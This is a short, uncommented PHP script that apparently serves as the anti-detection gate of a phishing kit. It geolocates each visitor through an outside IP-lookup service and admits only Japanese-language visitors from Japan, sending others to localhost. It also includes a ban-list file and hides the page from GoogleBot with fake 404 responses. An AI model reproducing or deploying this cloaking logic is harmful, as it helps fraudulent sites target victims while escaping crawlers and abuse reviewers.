<?php @error_reporting(0);

$ips = $_SERVER["REMOTE_ADDR"];    
$ipss = $_SESSION['ip'];
if ($ips !== $ipss)
{ header(sprintf('Location:%s', 'http://localhost/'));
    exit; }

$langs = $_SERVER['HTTP_ACCEPT_LANGUAGE'];

$lang = substr($langs,0,4);

$langss = substr($langs,0,4);

$ip = $_SERVER["REMOTE_ADDR"];

$url="https://extreme-ip-lookup.com/json/$ip";

$json = json_decode(file_get_contents($url));

$country = $json->{"countryCode"};

$countrys = array("JP");

if (!in_array($country, $countrys) || empty($langs) || !preg_match("/ja/i",$lang))

{
header(sprintf('Location:%s', 'http://localhost/'));
}
    

include '.../banni.php';

if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

?>